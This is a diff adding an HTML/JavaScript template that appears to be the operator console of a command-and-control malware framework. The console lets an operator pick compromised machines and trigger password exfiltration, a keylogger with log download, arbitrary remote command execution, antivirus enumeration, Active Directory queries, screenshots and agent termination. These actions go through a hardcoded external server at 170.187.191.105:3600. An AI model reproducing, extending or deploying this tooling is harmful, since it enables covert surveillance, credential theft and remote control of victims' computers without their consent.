@@ -1,0 +1,612 @@
+{% extends "layouts/base.html" %}
+
+{% block title %} Console {% endblock %} 
+
+<!-- Specific Page CSS goes HERE  -->
+{% block stylesheets %}{% endblock stylesheets %}
+
+{% block content %}
+
+<div class="container-fluid py-1" style="margin-top:30px;">
+  <select class="btn btn-outline-dark w-20" id="select" style="margin-left:-23px;">
+    <option value hidden selected>Choose one machine</option>
+    {% for i in range(len(data)) %}
+    <option class="dropdown-item" href="#">{{data[i].id}} | {{data[i].hostname}} | {{data[i].IP}} | {{data[i].OS}}</option>
+    {% endfor %}
+  </select>
+</div>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/2.9.3/umd/popper.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.6.0/js/bootstrap.min.js"></script>
+
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script> 
+
+
+  <div id="terminal" style="width:100%;">
+      <script>
+       var term = new Terminal();
+        
+       term.open(document.getElementById('terminal'));
+     	 term.write('Choose one option to exploit ! \r\n');
+      </script>
+  </div>
+
+
+  <div class="card my-4">
+      <div class="card-body px-0 pb-2">
+      	<div class="d-flex flex-column justify-content-around">
+   	        <div class="d-flex justify-content-center align-items-center">
+		    <button type="button" class="btn bg-gradient-primary text-white" style="width:220px" onclick="exfiltred_password(term)">Exfiltred Password</button>
+		    <button type="button" class="btn bg-gradient-primary text-white" style="width:220px;margin-left:25px;margin-right:25px" onclick="keylogger(term)">Keylogger Result</button>
+		    <button type="button" class="btn bg-gradient-primary text-white" style="width:220px" onclick="launch_cmd(term)">Launch command</button>
+	        </div>
+	        <div class="d-flex justify-content-center align-items-center">
+	            <button type="button" class="btn bg-gradient-primary text-white" style="width:220px" onclick="enumerate_av(term)">Enumerate AntiVirus</button>
+		    <button type="button" class="btn bg-gradient-primary text-white" style="width:220px;margin-left:25px;margin-right:25px" onclick="getdomaininfo(term)">Get Domain Informations</button>
+		    <button type="button" class="btn bg-gradient-primary text-white" style="width:220px" onclick="screenshot(term)">Screenshot</button>
+	        </div>
+    	        <div class="d-flex justify-content-center align-items-center">
+		    <button type="button" class="btn bg-gradient-primary text-white" style="width:220px;margin-left:25px;margin-right:25px" onclick="get_current_directory(term)">Get Current Directory</button>
+		    <button type="button" class="btn bg-gradient-primary text-white" style="width:220px" onclick="drop_machine(term)">Drop Machine</button>
+	        </div>
+	</div>
+      </div>
+  </div>
+  
+  <script>
+              
+      // Parser
+      
+      function parser_id(){
+          const chain = document.getElementById('select').value;
+          const tab = chain.split('|');
+          const id = tab[0];
+	        return id;
+      }
+      
+      function parser_hostname(){
+          const chain = document.getElementById('select').value;
+          const tab = chain.split('|');
+          const hostname = tab[1];
+	        return hostname;
+      }
+      
+      
+      //--------------------------------------------------------------------------------//
+      //--------------------------------- First group ----------------------------------//
+      //--------------------------------------------------------------------------------//
+      
+
+      function exfiltred_password(term){
+          if(document.getElementById('select').value == ''){
+
+             alert("Choose one machine before !");
+
+          }
+
+          else{
+              //fetch('http://127.0.0.1:80/exfiltred/'+ id);
+              
+              // vars
+                            
+              var id = parser_id().trim();
+              var hostname = parser_hostname().trim()
+              var name = 'Exfiltred Password';
+              
+              // Request POST
+              fetch('/console', {
+                  method: 'POST',
+                  headers: {
+                      'Content-Type': 'application/json'
+                  },
+                  body: JSON.stringify({hostname: hostname, name: name})
+              })
+              .then(response => {
+                  return response.json();
+              })
+              .then(data => {
+              
+                    var term = new Terminal();
+                    
+                    result = data['retour']
+                    
+     	            
+     	            // Write new content
+     	            term.write('From Agent ' + hostname + '> Exfiltred Password | ' + result + '\r\n');
+              })
+              .catch(error => {
+                  console.error('Erreur :', error);
+              });
+          }
+      }
+
+
+      async function keylogger(term){
+
+          if(document.getElementById('select').value == ''){
+
+              alert("Choose one machine before !");
+
+          }
+
+          else{
+          
+                            
+              // Variables
+              
+              var id = parser_id().trim();
+              var hostname = parser_hostname().trim();
+
+              var name = 'stop_keylogger';
+
+              var keylogger_value = '';
+
+              // Fetch the keylogger value for the given id
+              fetch(`/get_keylogger/${id}`)
+              .then(response => response.text())
+              .then(data => {
+                 keylogger_value = data;
+                 console.log(keylogger_value)
+                
+                if (keylogger_value == '0') {
+
+                    // Activate keylogger
+                    fetch(`http://170.187.191.105:3600/keylogger/${id}`);
+                    term.write(`From Agent ${hostname} > [+] - Keylogger has been activated on ${hostname}\r\n`);
+
+                } else {
+
+                    // Deactivate keylogger
+                    fetch(`http://170.187.191.105:3600/stop_keylogger/${id}`)
+                    .then(response => response.text())
+                    .then(data => {
+
+                      // Request POST
+                      fetch('/console', {
+                         method: 'POST',
+                         headers: {
+                           'Content-Type': 'application/json'
+                         },
+                         body: JSON.stringify({hostname: hostname, name: name})
+                      })
+                      .then(response => {
+                          return response.json();
+                      })
+                      .then(data => {
+                            
+                          result = data['retour'];
+                            
+                          file = data['file'];
+
+                          console.log(file);
+                          
+                          if(file){
+
+                            // Décode la valeur en base64 en une chaîne de caractères
+                            var decoded_file = atob(file);
+
+                            // Crée un objet Blob à partir de la chaîne de caractères
+                            var blob = new Blob([decoded_file], {type: 'text/plain'});
+
+                            // Create a link to download the file
+                            const downloadLink = document.createElement("a");
+                            downloadLink.href = URL.createObjectURL(blob);
+                            
+                            downloadLink.download = "keylogger_result.txt";
+
+                            // Click the link to trigger the download
+                            downloadLink.click();
+
+                          }
+
+                          // Write new content
+                          term.write(`From Agent ${hostname} > [+] - Keylogger has been desactivated on ${hostname} \r\n`);
+                                                  
+                      })
+                      .catch(error => {
+                          console.error('Erreur :', error);
+                      });
+
+                    })
+                    .catch(error => {
+                            console.error('Erreur :', error);
+                    });                    
+                }
+              })
+              .catch(error => {
+                 console.error(error);
+              });               
+          }
+      }
+      
+      function launch_cmd(term){
+      
+        if(document.getElementById('select').value == ''){
+
+            alert("Choose one machine before !");
+
+        }
+
+        else{
+                       
+           // Variables
+          
+           var id = parser_id().trim();
+           var hostname = parser_hostname().trim();
+          
+           // Input for Commands User
+          
+           term.write(`From Agent ${hostname} > Entrer a commandline : `);
+                                        
+           // Créer une variable pour stocker la ligne saisie
+           let name = '';
+      
+           // ON KEY FUNCTION :
+              
+           const onKeyHandler = term.onKey(e => {
+      			  // Récupérer le caractère saisi
+      		    const char = e.key;
+      			
+      			  // Ajouter le caractère saisi à la variable userInput
+              name += char;
+      			
+      			  // Vérifier si l'utilisateur a appuyé sur la touche "Enter"
+      			  if (char === '\r') {
+                  // Effacer la ligne de commande saisie par l'utilisateur du terminal
+                  term.write('\r\n');
+                
+                  name = name.trim();
+
+                  // Afficher la ligne saisie à l'écran
+                  term.write(`Vous avez saisi : ${name}\r\n`);
+  							
+                  // FastAPI
+                  fetch(`http://170.187.191.105:3600/cmd/${id}/${name}`)
+                  .then(response => {
+                    if(name){
+                            
+                      // Request POST
+                            
+                      fetch('/console', {
+                         method: 'POST',
+                         headers: {
+                         'Content-Type': 'application/json'
+                      },
+                        body: JSON.stringify({id: id, hostname: hostname, name: name})
+                      })
+                      .then(response => {
+                        return response.json();
+                      })
+                      .then(data => {
+                          
+                            result = data['retour'];
+                            
+                            file = data['file'];
+                            
+                            decoded_file = atob(file);
+                                        
+                                                    
+                            // Write new content
+                            term.write(`From Agent ${hostname} > Launch Command | ${name} - ${result}\r\n ${decoded_file} \r\n`);
+                                      
+                            // Arrêter la fonction onKey
+                            onKeyHandler.dispose();                                      
+                      })
+                      .catch(error => {
+                          console.error('Erreur :', error);
+                      });
+                    }
+                })	        				
+        					       			        			       	        
+        			        
+        			}  else if (char === '\x7f') {
+        				// Si l'utilisateur a appuyé sur la touche "Backspace", effacer le caractère précédent
+        				term.write('\b \b');
+
+        				// Si l'utilisateur a appuyé sur la touche "Backspace", effacer le caractère précédent de userInput
+                name = name.slice(0, -1);
+        				
+        			}
+        			else {			
+        				term.write(char);
+        			}
+
+            });              
+        }
+      }
+
+
+      //--------------------------------------------------------------------------------//
+      //--------------------------------- Second group ---------------------------------//
+      //--------------------------------------------------------------------------------//
+
+
+      
+      function enumerate_av(term){
+
+          if(document.getElementById('select').value == ''){
+
+              alert("Choose one machine before !");
+
+          }
+
+          else{
+                           
+              // Variables
+              
+              var id = parser_id().trim();
+              var hostname = parser_hostname().trim();
+              var name = 'show_av';
+              
+              // FastAPI request
+              fetch(`http://170.187.191.105:3600/enumerate_AV/${id}/`)
+              .then(response => {
+
+                // Request POST
+
+                fetch('/console', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({hostname: hostname, name: name})
+                })
+                .then(response => {
+                    return response.json();
+                })
+                .then(data => {
+                      
+                    result = data['retour'];
+
+                    file = data['file'];
+                            
+                    decoded_file = atob(file);
+                    
+                    // Write new content
+                    term.write(`From Agent ${id} > Enumerate_AV | ${result} \r\n ${decoded_file} \r\n`);
+                })
+                .catch(error => {
+                    console.error('Erreur :', error);
+                });
+              })
+              .catch(error => {
+                    console.error('Erreur :', error);
+              });
+
+            }
+      }
+
+      // GET DOMAIN INFORMATIONS
+      
+      function getdomaininfo(term){
+          if(document.getElementById('select').value == ''){
+              alert("Choose one machine before !");
+          }
+          else{     
+            // Variables
+              
+            var id = parser_id().trim();
+            var hostname = parser_hostname().trim();
+            var name = 'powershell Get-ADDomain';
+              
+            // FastAPI request
+            fetch(`http://170.187.191.105:3600/GetDomain/${id}`)
+            .then(response => {
+
+                // Request POST
+                fetch('/console', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({hostname: hostname, name: name})
+                })
+                .then(response => {
+                    return response.json();
+                })
+                .then(data => {
+                      
+                    result = data['retour'];
+                      
+                    file = data['file'];
+
+                    decoded_file = atob(file);
+                    
+                    // Write new content
+                    term.write(`From Agent ${hostname} > Get Domain Informations | ${result}\r\n ${decoded_file}\r\n`);
+                })
+                .catch(error => {
+                    console.error('Erreur :', error);
+                });
+            })
+            .catch(error => {
+              console.error('Erreur :', error);
+            });
+          }
+      }
+      
+      async function screenshot(term){
+          if(document.getElementById('select').value == ''){
+
+              alert("Choose one machine before !");
+
+          }
+
+          else{
+                            
+              // Variables
+              
+              var id = parser_id().trim();
+              var hostname = parser_hostname().trim();
+              var name = 'Screenshot';
+              
+              // Request FastAPI
+
+              fetch(`http://170.187.191.105:3600/screenshot/${id}`)
+              .then(response => {
+
+                // Request POST
+
+                fetch('/console', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({hostname: hostname, name: name})
+                })
+                .then(response => {
+                    return response.json();
+                })
+                .then(data => {
+                      
+                      // Get data from routes.py
+                      result = data['retour'];
+                      
+                      // PNG File
+                      
+                      file = data['file'];
+                                          
+                      if (file) {
+                          
+                          // Decode the file content from base64
+                          const content = "data:image/png;base64," + file;
+                          
+                          // Create an Bytes object
+                          const base64Content = content.split(",")[1];
+                          
+                          // Decode an Bytes object
+                          const byteCharacters = atob(base64Content);
+                          
+                          const byteNumbers = new Array(byteCharacters.length);
+                          
+                          // Generate arrayByte for the Image object
+                          for (let i = 0; i < byteCharacters.length; i++) {
+                              byteNumbers[i] = byteCharacters.charCodeAt(i);
+                          }
+                          
+                          // Create an Image object
+                          const byteArray = new Uint8Array(byteNumbers);
+                          
+                          // Set the source of the image to the decoded content
+                          const blob = new Blob([byteArray], { type: "image/png" });       
+                          
+                          // Create a link to download the file
+                          const downloadLink = document.createElement("a");
+                          downloadLink.href = URL.createObjectURL(blob);
+                          
+                          downloadLink.download = "screenshot.png";
+
+                          // Click the link to trigger the download
+                          downloadLink.click();
+                      }
+                      
+                    // Write new content
+                    term.write(`From Agent ${hostname} > Screenshot | ${result}\r\n`);
+                })
+                .catch(error => {
+                    console.error('Erreur :', error);
+                });
+
+              })
+              .catch(error => {
+                console.error(error);
+              });
+          }
+      }
+      
+      
+      //--------------------------------------------------------------------------------//
+      //--------------------------------- Third group ----------------------------------//
+      //--------------------------------------------------------------------------------//
+      
+
+      function get_current_directory(term){
+
+          if(document.getElementById('select').value == ''){
+
+              alert("Choose one machine before !");
+
+          }
+          else{
+                            
+              // Variables
+              
+              var id = parser_id().trim();
+              var hostname = parser_hostname().trim();
+              var name = 'dir';
+
+              fetch(`http://170.187.191.105:3600/cmd/${id}/${name}`)
+              .then(response => {
+                // Request POST
+                fetch('/console', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({hostname: hostname, name: name})
+                })
+                .then(response => {
+                    return response.json();
+                })
+                .then(data => {
+                      
+                   result = data['retour'];
+
+                   file = data['file'];
+
+                   decoded_file = atob(file);
+                                        
+                   // Write new content
+                   term.write(`From Agent ${hostname} > Get Current Directory | ${result} \r\n ${decoded_file} \r\n`);
+                })
+                .catch(error => {
+                   console.error('Erreur :', error);
+                });
+              })
+              .catch(error => {
+                console.log('Erreur :', error);
+              });
+          }
+      }
+
+      function drop_machine(term){
+          if(document.getElementById('select').value == ''){
+
+              alert("Choose one machine before !");
+
+          }
+          else{
+                                     
+              // Variables
+              
+              var id = parser_id().trim();
+              var hostname = parser_hostname().trim();
+              var name = 'Drop Machine';
+              
+              // Write new content
+     	        term.write(`From Agent ${hostname} > Drop Machine | Machine Killed \r\n`);
+              
+              // FastAPI request
+              fetch(`http://170.187.191.105:3600/kill/${id}`);
+          }
+      }
+  
+  </script>
+  
+
+
+  {% include 'includes/footer.html' %}
+
+
+
+
+
+{% endblock content %}
+
+<!-- Specific Page JS goes HERE  -->
+{% block javascripts %}{% endblock javascripts %}
